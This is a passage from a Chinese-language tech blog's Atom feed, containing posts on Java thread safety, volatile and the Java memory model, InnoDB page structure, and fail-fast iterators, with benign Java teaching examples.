<img src="https://yao177.github.io/post-images/1646113568033.svg" alt="对象锁" loading="lazy"><br>
因此本项目通过死锁超时检测，当主线程序阻塞一定时间后（例如20s），抛出导致死锁的类名，用户可以在注解中通过 exclude 指定不为该类创建动态代理。</p>
<h1 id="总结">总结</h1>
<p>至此，项目已介绍完成，想随便聊聊。<br>
本质上，这个项目就是利用了懒加载特性，先有个壳，再加载真正的 Bean 实体；其实这个思想在算法中也很常见，例如二分思想的经典算法——线段树，利用 lazy propagation (惰性传播) 在父节点打上修改的标记而不直接修改，只有真正访问到时才往子节点进行传递，提升了效率。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java 进阶｜线程安全]]></title>
        <id>https://yao177.github.io/post/java-synchronized/</id>
        <link href="https://yao177.github.io/post/java-synchronized/">
        </link>
        <updated>2021-04-01T03:27:31.000Z</updated>
        <content type="html"><![CDATA[<h1 id="线程安全">线程安全</h1>
<h2 id="定义">定义</h2>
<p>线程安全并没有统一的定义，这里使用《Java Concurrency In Practice》书中的定义：</p>
<blockquote>
<p>当多个线程访问一个对象时，如果不用考虑这些线程在运行时环境下的调度和交替执行，也不需要进行额外的同步，或者在调用方进行任何其他的协调操作，调用这个对象的行为都可以获得正确的结果，那这个对象是线程安全的。</p>
</blockquote>
<h2 id="线程安全程度">线程安全程度</h2>
<p>上面的定义非常严谨，它要求线程安全的代码满足：代码本身封装了所有必要的同步手段，令调用者无须关心多线程的问题，更不需要自己采取措施来保证在多线程环境下的正确调用。</p>
<p>保证这一点非常难，因此我们常常会另一个角度来理解线程安全，即线程安全程度。</p>
<p>《深入理解java虚拟机》中将 Java 语言各种共享操作共享的数据可以分为以下5类：<strong>不可变、绝对线程安全、相对线程安全、线程兼容和线程对立</strong>。</p>
<h3 id="不可变">不可变</h3>
<p>不可变（Immutable）的对象一定是线程安全的，无论是对象方法的实现还是方法的调用者，都不需要在采取任何的线程安全保障措施。</p>
<ul>
<li>如果数据是基本类型，那么定义时使用 final 关键字即可</li>
<li>如果数据是对象类型，那就需要保证对象的行为不会对其状态产生任何影响（如 String 类，调用其<code>substring()</code>、<code>replace()</code>等方法不会影响原来的值，只会返回一个新构造的字符串对象）。</li>
</ul>
<p>保证对象的行为不会对其状态产生任何影响最简单的方法就是把对象中带有状态的变量声明为 final，这样在构造函数结束之后，它就是不可变的，如 Integer。</p>
<pre><code class="language-Java">    /**
     * The value of the {@code Integer}.
     *
     * @serial
     */
    private final int value;

    /**
     * Constructs a newly allocated {@code Integer} object that
     * represents the specified {@code int} value.
     *
     * @param   value   the value to be represented by the
     *                  {@code Integer} object.
     */
    public Integer(int value) {
        this.value = value;
    }
</code></pre>
<h3 id="绝对线程安全">绝对线程安全</h3>
<p>不管运行时环境如何，调用者都不需要任何额外的同步措施。</p>
<p>要达到绝对线程安全通常付出很大代价，甚至不切实际的代价。</p>
<p>以 Vector 为例，它是一个线程安全的容器，因为其内部的操作方法都用了 synchronized 关键字作为同步措施，但是即使它所有的方法都被修饰成同步，也不意味着调用它的时候永远不需要同步手段了。请看下面的 demo：</p>
<pre><code class="language-Java">    private static Vector&lt;Integer&gt; vector = new Vector&lt;&gt;();

    public static void main(String[] args) {
        while (true) {
            for (int i = 0; i &lt; 10; i++) {
                vector.add(i);
            }
            Thread removeThread = new Thread(() -&gt; {
                for (int i = 0; i &lt; vector.size(); i++) {
                    vector.remove(i);
                }
            });
            Thread printThread = new Thread(() -&gt; {
                for (int i = 0; i &lt; vector.size(); i++) {
                    System.out.println(vector.get(i));
                }
            });
            removeThread.start();
            printThread.start();
            //避免过多线程
            while (Thread.activeCount() &gt; 10) ;
        }
    }
</code></pre>
<p>输出结果如下：<br>
<img src="https://yao177.github.io/post-images/1646211347456.png" alt="" loading="lazy"></p>
<p>虽然 Vector 的 add()、remove()、get() 方法都是同步的，但并不能保证调用就是绝对线程安全的。假设打印线程在打印序号为i的元素前，线程被系统调度挂起，切换为删除线程，而这个删除线程刚好把序号为i的元素删除了，系统再切换打印线程运行时，这个序号为i的元素已经被删除，再调用 get(i) 访问时就会得到 ArrayIndexOutOfBoundsException。要保证代码是绝对线程安全的，必须在调用方加一些同步措施：</p>
<pre><code class="language-Java">  Thread removeThread = new Thread(() -&gt; {
    synchronized (vector) {
      for (int i = 0; i &lt; vector.size(); i++) {
        vector.remove(i);
      }
    }
  });
  Thread printThread = new Thread(() -&gt; {
    synchronized (vector) {
      for (int i = 0; i &lt; vector.size(); i++) {
        System.out.println(vector.get(i));
      }
    }
  });
</code></pre>
<h3 id="相对线程安全">相对线程安全</h3>
<p>这是通常意义的线程安全，它要求对该对象的单独操作是线程安全的，但是对于特定顺序的连续调用，需要在调用端使用额外的同步手段保证调用的正确性。</p>
<p>上面的代码就是相对线程安全的案例，在 Java 中大部分线程安全类属于相对线程安全类型，如 Vector、Hashtable 等。</p>
<h3 id="线程兼容">线程兼容</h3>
<p>对象本身就不是线程安全的，但是可以通过通过同步手段保证调用端在并发环境下的线程安全。如 ArrayList、HashMap 等。</p>
<h3 id="线程对立">线程对立</h3>
<p>无论调用端是否采取同步措施，都无法并发使用。这种类型很少出现，应当尽量避免。</p>
<p>例如 Thread 类的 suspend()、resume()，这两个方法的功能是中断线程和恢复线程（这两个 API 已被 JDK废弃）。</p>
<blockquote>
<p>被废弃是因为 suspend() 在导致线程暂停的同时，并不会去释放任何锁资源。其他线程都无法访问被它占用的锁。直到对应的线程执行 resume() 方法后，被挂起的线程才能继续，从而其它被阻塞在这个锁的线程才可以继续执行。<br>
但是，如果 resume() 操作出现在 suspend() 之前执行，那么线程将一直处于挂起状态，同时一直占用锁，这就产生了死锁。</p>
</blockquote>
<h1 id="线程安全的实现">线程安全的实现</h1>
<p>线程安全的实现可以分为三类：<strong>阻塞（互斥）同步、非阻塞同步和可重入代码</strong>。</p>
<h2 id="阻塞同步">阻塞同步</h2>
<p>互斥同步是常见的一种保障并发正确性的手段。Java 中常用的互斥同步手段就是 synchronized 关键字和 ReentrantLock 类。</p>
<ul>
<li>同步是指多个线程并发访问共享数据时，保证其数据在同一个时刻只被一个（或者一些，使用信号量的时候）线程使用</li>
<li>互斥是实现同步的一种手段</li>
</ul>
<h3 id="synchronized">synchronized</h3>
<p>synchronized 关键字是 Java 原生语法层面的互斥锁。synchronized 关键字经过编译后，会在同步块的前后插入 monitorenter 和 monitorexit 这两个字节码指令，这两个字节码都需要一个 reference 类型参数来指定要加锁和解锁的对象</p>
<h3 id="reentrantlock">ReentrantLock</h3>
<p>跟 synchronized 一样，ReentrantLock 也具有可重入性，但在代码写法上表现为 Java API 层面的互斥锁（lock() 和 unlock()方法配合 try/finally 语句来完成）。</p>
<h3 id="对比">对比</h3>
<p>与 synchronized 相比，ReentrantLock 拥有一些高级功能：</p>
<ul>
<li>等待可中断：当持有锁的线程长期不释放锁的时候，正在等待的线程可以选择放弃等待，改为处理其他事情，这对执行时间很长的同步块很有帮助。</li>
<li>公平锁：多个线程在等待同一个锁时，必须按照申请锁的时间顺序来依次获得锁（synchronized 中的锁是非公平的）。</li>
<li>锁可以绑定多个条件：一个 ReentrantLock 对象同时可以绑定多个 Condition 对象。</li>
</ul>
<p>从性能上看，synchronized 和 ReentrantLock 之间并没有明显的差异，如果不是需要使用 ReentrantLock 中的高级功能的情况下，一般情况都推荐直接使用 synchronized 关键字。</p>
<h2 id="非阻塞同步">非阻塞同步</h2>
<p>互斥同步的最主要的问题就是进行线程阻塞和唤醒带来的性能问题，因此这种同步被称为阻塞同步。</p>
<p>从处理方式上说，互斥同步是一种悲观的并发策略，无论资源是否真的被竞争，都一定要做正确的同步措施。</p>
<p>而非阻塞同步是一种基于冲突检测的乐观并发策略，简单来讲是先进行操作，如果没有其他线程争用共享数据，那操作就成功了；如果共享数据有争用，产生了冲突，那就采取其他的补偿措施（最简单的就是不断重试，直到成功为止）。</p>
<h3 id="乐观并发策略">乐观并发策略</h3>
<p>乐观并发策略的实现依赖于硬件指令，因为必须要从硬件层面保证冲突检测和操作这两个步骤具有原子性，如果从软件层面保证就会变成互斥同步，没有意义。</p>
<p>常见的这类指令有：</p>
<ul>
<li>测试并设置（Test-and-Set）</li>
<li>获取并增加（Fetch-and-Increment）</li>
<li>交换（Swap）</li>
<li>比较并交换（Compare-and-Swap）</li>
<li>加载链接/条件存储（Load-Linked/Store-Conditional）</li>
</ul>
<p>Java中可以使用 CAS 操作，该操作由 sun.misc.Unsafe 类里面的 compareAndSwapInt() 和 compareAndSwapLong() 等几个方法包装提供，上层有 Atomic 原子包工具类方便使用。</p>
<h3 id="cas">CAS</h3>
<p>CAS 操作的“ABA”问题，如果一个变量初始值是A，线程1读到变量值是A，这时候另一个线程2也从也读取到变量值为A，并且线程2进行了一些操作将变量值修改为B，然后线程2又将变量值修改为A，这时候线程1进行CAS操作发现变量的值仍是A，然后线程1操作成功。尽管线程1的CAS操作成功，但是不代表这个过程就是没有问题的，如果链表的头在变化了两次后恢复了原值，但是不代表链表就没有变化。</p>
<p>J.U.C 包提供了带有标记的原子类 AtomicStampedReference 来解决 CAS 的 ABA 问题，做法是通过控制变量值的版本来保证 CAS 的正确性。</p>
<h2 id="无同步方案">无同步方案</h2>
<p>同步时只是保证共享数据争用时的正确性的手段，但是如果方法不涉及共享数据，那它自然不需要任何同步手段去保证正确性，下面是两类无同步的方案。</p>
<h3 id="可重入代码">可重入代码</h3>
<p>可重入代码也叫纯代码（Pure Code），其在运行过程中可以被打断，并由开始处再次执行，并且在合理的范围内（多次重入，而不出现错误），程序可以在被打断处继续执行，且执行结果不受影响。可重入性的特点如下：</p>
<ul>
<li>不依赖公用的系统资源和数据</li>
<li>用到的状态都由参数传入</li>
<li>不调用非可重入的方法</li>
<li>输出完全由输入决定，只要输入相同的数据，都能返回相同的结果（类似于幂等性）</li>
</ul>
<h3 id="线程本地存储">线程本地存储</h3>
<p>共享数据的可见范围在同一个线程之内，那么无需同步也能保证同一线程内不出现共享数据争用的问题。</p>
<p>Java 中通过 ThreadLocal 类实现线程本地存储的功能。</p>
<h4 id="threadlocal">ThreadLocal</h4>
<p>每个 Thread 对象中有一个 ThreadLocalMap 对象，存储的是以 ThreadLocal.threadLocalHashCode 属性值为 Key 值，以本地线程变量为值的 K-V对。</p>
<p>每一个 ThreadLocal 对象的 threadLocalHashCode 值是唯一计算出来的，ThreadLocal 类中有一个原子整数类型（AtomicInteger）的静态变量 nextHashCode 来维护 threadLocalHashCode 值，每次计算 threadLocalHashCode 值通过调用 AtomicInteger.getAndAdd() 方法添加一个固定偏移量得到，这里通过 CAS 操作保证唯一性。</p>
<h1 id="参考资料">参考资料</h1>
<ul>
<li>《Java Concurrency In Practice》</li>
<li>《深入理解java虚拟机》</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java 进阶｜Java 内存模型]]></title>
        <id>https://yao177.github.io/post/java-volatile/</id>
        <link href="https://yao177.github.io/post/java-volatile/">
        </link>
        <updated>2021-03-31T03:24:50.000Z</updated>
        <content type="html"><![CDATA[<h1 id="内存模型">内存模型</h1>
<p><strong>内存模型</strong>可以理解为在特定的操作协议下，对特定的内存或高速缓存进行读写访问的过程抽象。<br>
在多处理器计算机系统中，每个处理器都有自己的高速缓存，且所有处理器都共享同一主存：<br>
<img src="https://yao177.github.io/post-images/1646200411287.svg" alt="" loading="lazy"></p>
<p><strong>缓存一致性（Cache Coherence）</strong> 是多处理器系统必须解决的问题，当多个处理器的运算任务都涉及同一块主存区域时，将可能导致各处理器的高速缓存数据不一致，这时如何同步回主存就需要缓存一致性协议来协调；</p>
<p><strong>乱序执行（Out-Of-Order Execution）</strong> 也是处理器的一项优化，该优化只保证最终结果的一致性，但不保证各语句的执行顺序与代码中的顺序一致。</p>
<p>Java 内存模型和多处理器计算机系统有着很多相似之处：</p>
<figure data-type="image" tabindex="1"><img src="https://yao177.github.io/post-images/1646200533914.svg" alt="" loading="lazy"></figure>
<p><strong>内存一致性</strong>：每条线程都有自己的工作内存，里面保存了被该线程使用到的变量的主内存副本拷贝，线程对变量的所有操作都必须在工作内存中进行，不能直接读写主内存中的变量，相似的，Java 虚拟机也定义了一套内存访问协议来保证内存一致性；</p>
<p><strong>指令重排序</strong>：对应于处理器乱序执行，Java 虚拟机的即时编译器中也有着类似的优化，同样只保证最终结果的一致性。</p>
<h1 id="volatile">volatile</h1>
<p>volatile 是 Java 虚拟机提供的最轻量的同步机制，但很难被正确的理解与使用，通过学习 Java 内存模型对 volatile 专门定义的一些特殊访问规则，或许会对理解 volatile 有一定帮助。</p>
<p>当一个变量被定义为 volatile 之后，将会具备两种特性：</p>
<blockquote>
<p>可见性：当一条线程改变了该变量的值，新值对所有其他线程来说都是可以立即感知的；<br>
禁止指令重排序优化：volatile 变量赋值完成语句之后的指令不会被重排序到该赋值指令之前。</p>
</blockquote>
<h2 id="可见性">可见性</h2>
<p>大多数开发人员最容易误解的是 volatile的 可见性特性，会从 volatile 变量在各个线程中是一致的，错误的推导出基于 volatile 变量的运算也是并发安全的，下面一段代码对此进行了实验：</p>
<pre><code class="language-Java">private static volatile int sum = 0;

public static void increase() {
    ++sum;
}

/**
 * 使用10跟线程对sum各累加10000次，理论上返回值为100000
 */
public static void test() {
    try {
        Thread[] threads = new Thread[10];
        for (int i = 0; i &lt; 10; ++i) {
            threads[i] = new Thread(new Runnable() {
                @Override
                public void run() {
                    for (int i = 0; i &lt; 10000; ++i) {
                        increase();
                    }
                }
            });
            threads[i].start();
        }
        //等待所有线程执行完毕
        for (int i = 0; i &lt; 10; ++i) {
            threads[i].join();
        }
        System.out.println(&quot;sum = &quot; + sum);
    } catch (Exception e) {
        //ignore
    }
}


public static void main(String[] args) {
    //实验10次
    for (int i = 0; i &lt; 10; ++i) {
        sum = 0;
        test();
    }
}
</code></pre>
<p>如果基于 volatile 变量的运算也是<em>并发安全</em>的，那输出值应该为 10 个 100000，但事实上返回值均不为 100000。</p>
<figure data-type="image" tabindex="2"><img src="https://yao177.github.io/post-images/1646200897491.png" alt="" loading="lazy"></figure>
<p>这是因为，Java 中的运算<code>++sum</code>并不是原子操作，我们可以使用反编译来验证</p>
<figure data-type="image" tabindex="3"><img src="https://yao177.github.io/post-images/1646200993884.png" alt="" loading="lazy"></figure>
<p>通过 Javap 反编译测试代码可以看到，<code>++sum</code>操作产生了四条指令，getstatic 指令把 sum 值取到栈顶，volatile 关键字保证了此时该值是正确的，但是在执行后续<code>iconst_1</code>和<code>iadd</code>指令时，其他线程可能已经完成了一次“++sum”，此时栈顶的 sum 值其实已经过期了，当该线程执行<code>putstatic</code>后，其他线程抢先完成的 ++sum 操作就被覆盖了，最终导致 sum 值小于期望的 100000。</p>
<blockquote>
<p>准确来说，使用 Javap 反编译来分析并发问题并不是严谨的，因为 Javap 反编译得到的一条字节码指令也未必是一个原子操作，比如字节码解释器可能需要运行多行代码才能实现该一条字节码的语义，如果是编译执行，一条字节码指令可能转化成多条本地机器码指令，有兴趣的同学可以自己试一下运行时反汇编</p>
</blockquote>
<p>理解了 volatile 的可见性之后，可以总结出使用场景：</p>
<ol>
<li>运算结果并不依赖变量的当前值（如作为状态变量），或仅有单一线程修改变量值</li>
<li>变量不与其他状态变量共同参与不变约束（因为对其中一个变量值赋值之后并在对其他变量赋值之前，不变约束可能失效）</li>
</ol>
<pre><code class="language-Java">// 当shutdown()被调用时，所有线程的doWork()都会立刻停止
private volatile boolean isShutdown = false;
public void shutdown() {
    isShutdown = true;
}
public void doWork() {
    while(!isShutdown) {
	      // anything
    }
}
</code></pre>
<p>如果不能同时满足上述两个条件，则必须使用锁来保证并发安全</p>
<h2 id="禁止指令重排序优化">禁止指令重排序优化</h2>
<p>在介绍 volatile 的禁止指令重排序优化之前，首先要了解一下线程内表现为串行的语义（Within-Thread As-If-Serial Semantics）和内存屏障（Memory Barrier）</p>
<blockquote>
<p>内存屏障：指令重排序时不能把内存屏障之后的指令重排序到内存屏障之前<br>
线程内表现为串行的语义：普通的变量仅仅会保证在该方法的执行过程中所有依赖赋值结果的地方都能获取到正确的结果，而不能保证变量赋值的操作顺序与程序代码中执行的顺序一致，这在单线程的方法执行过程中是无法感知的，因而表现为线程内串行</p>
</blockquote>
<p>举个栗子：</p>
<pre><code class="language-Java">int a = 1; // L1
int b = 2; // L2
a = a + 1; // L3
a = a * 2; // L4
int c = a; // L5
</code></pre>
<p>以行号代表语句，虚拟机只会保证语句1、3、4顺序执行（四则运算规则），且语句5在语句4之后执行（c对a的依赖关系）；至于语句2，它可能出现在任意位置（以指令重排序优化结果为准），因为它与<code>a</code>和<code>c</code>均没有依赖关系</p>
<p>指令重排序优化对单线程程序没有负面影响，但会干扰程序的并发执行，再举个栗子：</p>
<pre><code class="language-Java">static private boolean initialized = false;

/**
    * 初始化
    */
public static void init() {
    //init task A
    //init task B
    //init task C
    //init task D
    //...
    initialized = true;
}

/**
    * 工作函数，必须在初始化完成后才能开始工作
    */
public static void doWork() {
    try {
        //等待初始化完成
        while (!initialized) {
        }
        //do work A
        //do work B
        //do work C
        //do work D
        //...
    } catch (Exception ign) {
        //ignore
    }
}
</code></pre>
<p>如果<code>init()</code>和<code>doWork()</code>运行在同一线程中，那么可以正常运行，但如果运行在不同线程中，由于指令重排序优化的存在，init() 中的<code>initialized = true;</code>语句可能会被提前执行，这时并发运行在不同线程的 doWork() 就会出现并发问题，而如果将 initialized 定义为 volatile 变量则可以避免这类问题。</p>
<p>那么，volatile 关键字到底是如何禁止指令重排序优化的呢，我们可以通过运行时反汇编来查看加入 volatile 关键字和未加入 volatile 关键字时所生成的汇编码的差别。</p>
<p>这是未加 volatile 关键字的汇编码：</p>
<figure data-type="image" tabindex="4"><img src="https://yao177.github.io/post-images/1646202478210.png" alt="" loading="lazy"></figure>
<p>这是加了 volatile 关键字的汇编码：</p>
<figure data-type="image" tabindex="5"><img src="https://yao177.github.io/post-images/1646202518393.png" alt="" loading="lazy"></figure>
<p>注释显示这是<code>init()</code>函数的第12行代码产生的汇编码，那么第12行做了什么了呢？</p>
<figure data-type="image" tabindex="6"><img src="https://yao177.github.io/post-images/1646202554738.png" alt="" loading="lazy"></figure>
<p>这行代码对 initialized 变量进行了赋值，加了 volatile 关键字的赋值操作多了<code>lock addl $0x0,(%rsp)</code>这一指令，<code>addl $0x0,(%rsp)</code>的含义是把 ESP 寄存器的值加 0，显然是一个空操作，那关键点就是 <strong>lock 前缀</strong>了。</p>
<p>lock 前缀的作用是使得本 CPU 的 Cache、写入内存，同时会引起其他 CPU 或者内核无效化各自的 Cache，该操作使得 volatile 变量的修改对其他 CPU 立即可见，同时，<code>lock addl $0x0,(%rsp)</code>指令把修改同步到内存时，意味着所有之前的操作都已经执行完毕，这便形成了“指令重排序无法越过内存屏障”的效果，之前的指令无法被重排序到该指令之后，同样，之后的指令无法被重排序到该指令之前。</p>
<h2 id="总结">总结</h2>
<p>最后，我们再看一下 Java 内存模型对 volatile 变量定义的特殊规则：</p>
<ul>
<li>每次使用 volatile 变量之前都必须从主内存刷新最新的值</li>
<li>每次修改完 volatile 变量都必须立刻同步到主内存中</li>
<li>volatile 修饰的变量不会被指令重排序优化</li>
</ul>
<p>可以看到，这三条规则与反汇编得出结论相一致。</p>
<h1 id="先行发生原则">先行发生原则</h1>
<p>Java 内存模型是围绕着如何在并发过程中处理<strong>原子性、可见性和有序性</strong>这三个特征来构建的，前面已经介绍过 volatile 关键字的“禁止指令重排序优化”来保证线程之间操作的有序性，另一个我们常用的保证有序性的手段是 synchronized 关键字；如果 Java 中的所有有序性都要靠这两个关键字来保证，那代码会很繁琐，但我们平时开发时并没有感觉到这一点，这是因为 Java 语言中又一个先行发生原则（happens-before）。</p>
<blockquote>
<p>先行发生原则</p>
</blockquote>
<ul>
<li>程序次序规则 (Program Order Rule)：在一个线程内，按照代码顺序，书写在前面的操作先行发生于书写在后面的操作。准确地说应该是控制流顺序而不是代码顺序，因为要考虑分支、循环等结构。</li>
<li>监视器锁定规则 (Monitor Lock Rule)：一个unlock操作先行发生于后面对同一个对象锁的 lock 操作。这里强调的是同一个锁，而“后面”指的是时间上的先后顺序，如发生在其他线程中的 lock 操作。</li>
<li>volatile变量规则 (Volatile Variable Rule)：对一个 volatile 变量的写操作发生于后面对这个变量的读操作，这里的“后面”也指的是时间上的先后顺序。</li>
<li>线程启动规则 (Thread Start Rule)：Thread 独享的<code>start()</code>方法先行于此线程的每一个动作。</li>
<li>线程终止规则 (Thread Termination Rule)：线程中的每个操作都先行发生于对此线程的终止检测，我们可以通过<code>Thread.join()</code>方法结束、<code>Thread.isAlive()</code>的返回值检测到线程已经终止执行。</li>
<li>线程中断规则 (Thread Interruption Rule)：对线程<code>interrupte()</code>方法的调用优先于被中断线程的代码检测到中断事件的发生，可以通过<code>Thread.interrupted()</code>方法检测线程是否已中断。</li>
<li>对象终结原则 (Finalizer Rule)：一个对象的初始化完成 (构造函数执行结束) 先行发生于它的<code>finalize()</code>方法的开始。传递性 (Transitivity)：如果操作A先行发生于操作B，操作B先行发生于操作C，那就可以得出操作A先行发生于操作C的结论。</li>
</ul>
<p>先行发生原则最容易被误解的地方是，很多人从字面意思上理解这些规则，以“监视器锁定规则 (Monitor Lock Rule)”为例：</p>
<p>一个 unlock 操作先行发生于后面对同一个对象锁的 lock 操作，这句话不是字面意义上，针对同一个锁 lock 方法必须在 unlock 方法之后调用（虽然咋看起来没毛病，排他锁确实只能被一个线程lock住。。。），这句话的意思是，<em>当线程A解锁了 monitor，接着线程B锁住了该 monitor，那么，线程A在解锁之前所有的写操作对线程B而言都是可见的</em>。</p>
<p>同样，对于 volatile 变量规则( Volatile Variable Rule)，<em>如果线程A写入了 volatile 变量v，接着线程B读取了v，那么，线程A写入v以及之前的所有写操作都对线程B可见</em>（无效化了除线程A以外的所有线程的工作内存）。</p>
<p>其他规则就不一一赘述。</p>
<p>总之，一句话总结：</p>
<p><strong>衡量并发安全问题时不要受到时间顺序的干扰，一个操作“时间上的先发生”并不意味着“先行发生”，一切必须以先行发生原则为准，如果不满足任何一条先行发生原则，那么就是线程不安全的（指令重排序会给你足够多的惊喜）。</strong></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[数据库｜InnoDB 学习]]></title>
        <id>https://yao177.github.io/post/innodb-study/</id>
        <link href="https://yao177.github.io/post/innodb-study/">
        </link>
        <updated>2021-02-01T06:07:31.000Z</updated>
        <content type="html"><![CDATA[<h1 id="b-树">B+ 树</h1>
<figure data-type="image" tabindex="1"><img src="https://yao177.github.io/post-images/1646119612971.png" alt="B+树示意" loading="lazy"></figure>
<ul>
<li>叶子节点真正存储数据</li>
<li>相邻叶子节点通过双向链表连接</li>
<li>每个叶子节点存储了1页（page）数据，页通常是 16K，文件系统页通常为 4K，硬盘页通常为 512字节<br>
<img src="https://yao177.github.io/post-images/1646122945576.png" alt="" loading="lazy"><br>
假设每个数据行大小为rK，主键为bigint（8字节），页指针为6字节，则一个非叶子节点能存储16k/14 = 1170 个字节点信息。（为什么指针大小为6字节）<br>
<img src="https://yao177.github.io/post-images/1646123070143.png" alt="" loading="lazy"><br>
<img src="https://yao177.github.io/post-images/1646123090655.png" alt="" loading="lazy"><br>
<img src="https://yao177.github.io/post-images/1646123151296.png" alt="" loading="lazy"><br>
<img src="https://yao177.github.io/post-images/1646123173338.png" alt="" loading="lazy"></li>
</ul>
<h3 id="虚拟最大最小记录infimum-and-supremum-records">虚拟最大最小记录(Infimum and Supremum Records)</h3>
<p>最大记录是这个数据页中逻辑上最大的记录，所有用户的记录都小于它。最小记录是数据页上最小的记录，所有用户记录都大于它。他们在数据页被创建的时候创建，而且不能被删除。引入他们主要是方便页内操作。</p>
<h2 id="user-records">User Records</h2>
<p>在页的7个组成部分中，存储的记录会按照指定的行格式存储到User Records部分。但是在一开始生成页的时候，其实并没有User Records这个部分，每当插入一条记录，都会从Free Space部分，也就是尚未使用的存储空间中申请一个记录大小的空间划分到User Records部分，当Free Space部分的空间全部被User Records部分替代掉之后，也就意味着这个页使用完了，如果还有新的记录插入的话，就需要去申请新的页了。</p>
<h2 id="free-space">Free Space</h2>
<p>从PAGE_HEAP_TOP开始，到最后一个数据目录，这之间的空间就是空闲空间，都被重置为0，当用户需要插入记录时候，首先在被删除的记录的空间中查找，如果没有找到合适的空间，就从这里分配。空间分配给记录后，需要递增PAGE_N_RECS和PAGE_HEAP_TOP。</p>
<h2 id="page-directory">Page Directory</h2>
<p>用户的记录是从低地址向高地址扩展，而数据目录则相反。在数据页被初始化的时候，就会在数据页最后(当然在checksum之前)创建两个数据目录，分别指向最大和最小记录。之后插入新的数据的时候，需要维护这个目录，例如必要的时候增加目录的个数。每个数据目录占用两个字节，存储对应记录的页内相对位置，每个目录称为一个槽Slots。假设目录N，这个目录N管理目录N-1(不包括)和目录N之间的记录，我们称目录N own 这些记录。在目录N指向的记录中，字段n-owned会记录own记录的数量。由此可见，目录own的记录不能太多，因为太多的话，即意味着目录太过稀疏，不能很好的提高查询效率，但同时也不能own太少，这会导致目录数量变多，占用过多的空间。在InnoDB的实现中，伪记录Infimum的n_owned值总是1，记录supremum的n_owned的取值范围为[1，8]，其他用户记录n_owned的取值范围是[4，8]，平均是6个记录，如果超过这个数量，就需要重新均衡目录的数量。目录的增加和删除可能需要进行内存拷贝，但是由于目录占用的总体空间很小，开销可以忽略不计。</p>
<p>由于在InnoDB中Page Directory是稀疏目录，二叉查找的结果只是一个粗略的结果，因此InnoDB必须通过recorder header中的next_record来继续查找相关记录。同时，Page Directory很好地解释了recorder header中n_owned值地含义，因为这些记录并包括在Page Directory中。B+树索引本身并不能找到具体的一条记录，能找到的只是该记录所在的页。数据库把页载入到内存，然后通过Page Directory再进行二分查找。二分查找的时间复杂度很低，同时再内存中的查找很快，因此通常忽略这部分查找所用的时间。</p>
<h2 id="file-trailer">File Trailer</h2>
<p>为了检测页是否已经完整的写入磁盘（如可能发生的写入过程中磁盘损坏、机器关机等），InnoDB存储引擎的页中设置了File Trailer部分。</p>
<p>这个部分处于数据页最后的位置，只有8个字节。低地址的四个字节存储checksum的值，高地址的四个字节和File Header中的FIL_PAGE_LSN的低位四字节相同。注意这里的checksum的值不一定与FIL_PAGE_SPACE_OR_CHKSUM的相同，这个依赖不同的checksum计算方法。</p>
<p>默认配置下，InnoDB每次从磁盘读取一个页就会检测该页的完整性，即页是否发生Corrupt，这就是通过File Traile部分来进行检测，而该部分的检测会有一定的开销。我们可以通过参数innodb_checksums来开启或关闭对这个页完整性的检查。</p>
<blockquote>
<p>参考资料<br>
《极客时间：B+树：MySQL数据库索引是如何实现的？》</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java 基础｜快速失败机制]]></title>
        <id>https://yao177.github.io/post/java-ji-chu-orkuai-su-shi-bai-ji-zhi/</id>
        <link href="https://yao177.github.io/post/java-ji-chu-orkuai-su-shi-bai-ji-zhi/">
        </link>
        <updated>2020-09-15T12:56:55.000Z</updated>
        <content type="html"><![CDATA[<h1 id="基本介绍">基本介绍</h1>
<p>在使用迭代器对集合对象进行遍历的时候，如果 A 线程对集合进行遍历，正好 B 线程对集合进行修改（增加、删除、修改）则 A 线程会抛出 <code>ConcurrentModificationException</code> 异常。</p>
<h1 id="原理">原理</h1>
<p>迭代器在遍历时直接访问集合中的内容，并且在遍历过程中使用一个 modCount 变量。集合在被遍历期间如果内容发生变化，就会改变 modCount 的值。每当迭代器使用 hashNext()/next() 遍历下一个元素之前，都会检测 modCount 变量是否为 expectedmodCount 值，是的话就返回遍历；否则抛出异常，终止遍历。</p>
<h2 id="为什么-util-中的集合类遍历时不会快速失败">为什么 util 中的集合类遍历时不会快速失败？</h2>
<p>异常的抛出条件是检测到 modCount ≠ expectedmodCount 这个条件，而遍历时发生变化会同事给 expectedmodCount 值 +1，因此不会出现问题</p>
<h2 id="javautil-中哪些集合不能在多线程下使用">java.util 中哪些集合不能在多线程下使用？</h2>
<p>都不可以，都是快速失败的，不能在多线程下发生并发修改</p>
<h1 id="安全失败">安全失败</h1>
<p>采用安全失败机制的集合容器，在遍历时不是直接在集合内容上访问的，而是先复制原有集合内容，在拷贝的集合上进行遍历。</p>
<p>因此，安全失败时，迭代器不能访问修改后的内容</p>
<p>java.util.concurrent 都是安全失败，可以在多线程下并发使用和修改</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java 基础｜几个小疑惑]]></title>
        <id>https://yao177.github.io/post/java-ji-chu-orji-ge-xiao-yi-huo/</id>
        <link href="https://yao177.github.io/post/java-ji-chu-orji-ge-xiao-yi-huo/">
        </link>
        <updated>2020-09-15T12:53:48.000Z</updated>
        <content type="html"><![CDATA[<h1 id="为什么要有-object-类">为什么要有 Object 类？</h1>
<p>可以理解为一个基础的模版类，提供 <code>hashcode()</code>、<code>compareTo()</code>、<code>toString()</code> 等基础函数模版</p>
<h1 id="对象变量和引用的关系">对象变量和引用的关系？</h1>
<p>每个对象变量都属于一个类型</p>
<p>子类引用赋给超类时，OK</p>
<p>超类引用赋给子类时，必须进行类型转换（类似 C++ 中的 dynamic_cast 操作）；先用 instanceof 检验一下是否可以转换</p>
<pre><code class="language-java">if (staff[1] instanceof Manager) {	
		boss = (Manager) staff[1]; // OK	...
}
String c = (String) staff[1]; // Fail
</code></pre>
<ul>
<li>只能在继承层次内进行类型转换</li>
<li>在将超类转换成子类之前，应该使用 instanceof 进行检查</li>
<li>多态的动态绑定机制可以自动找到响应方法，只有在使用「特定方法」时才会需要类型转换——超类的设计不够合理</li>
</ul>
<h1 id="null-检查应该在什么时候">null 检查应该在什么时候</h1>
<p>给别人前，拿到之后</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java 基础｜OOP 面向对象]]></title>
